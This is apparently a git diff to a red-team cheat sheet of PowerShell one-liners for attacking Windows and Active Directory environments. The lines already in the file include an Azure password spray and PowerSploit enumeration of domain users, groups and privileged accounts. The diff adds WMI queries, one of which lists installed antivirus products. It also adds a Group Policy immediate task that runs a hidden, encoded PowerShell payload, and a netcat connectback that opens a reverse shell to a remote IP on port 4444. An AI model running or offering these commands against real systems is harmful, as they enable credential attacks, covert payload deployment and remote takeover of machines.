@@ -9,6 +9,13 @@ Azure Password Spray----Invoke-MSOLSpray -Userlist ./users.txt -Password "Spring
 
 PowerShell Command History File----% AppData Roaming Microsoft Windows PowerShell PSReadLine ConsoleHost_history.txt
 
+##WMIC
+List all Files in Directory----Get-ChildItem C:\Users\user -Recurse
+List Scheduled Tasks----
+Raw WMIC Query----Get-CimInstance -Query "SELECT * from Win32_Process WHERE name LIKE 'P%'"
+Get AVs Installed----Get-CimInstance -Namespace root\securitycenter2 -ClassName antispywareproduct
+List All Namespaces----Get-WmiObject -Namespace root\CIMv2 -list
+
 ##PowerSploit
 Enumerate User----Get-NetUser <user>
 Enumerate Group----Get-NetGroup <group>
@@ -18,3 +25,6 @@ Get all effective member of group----Get-NetGroupMember -GroupName <group> -Recu
 Search the forest global catalog----Get-NetUser -UserName <user> -ADSpath "GC: //domain.com"
 Find Privileged Machine Accounts----Get-NetGroup -AdminCount | Get-NetGroupMember -Recurse | ?{$_.MemberName -like '*$'}
 Find Domain Admins and Users with same first/last name----Get-NetGroupMember -GroupName "Domain Admins" -FullData | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)"} | Select-Object -Property displayname,samaccountname
+New-GPOImmediateTask -TaskName Debugging -GPODisplayName SecurePolicy -CommandArguments '-NoP -NonI -W Hidden -Enc JABXAGMAPQBO...' -Force
+
+Basic NC connectback----powershell.exe -NoExit -Command 'C:/temp/temp2/nc.exe -v 192.168.99.21 4444 -e powershell'
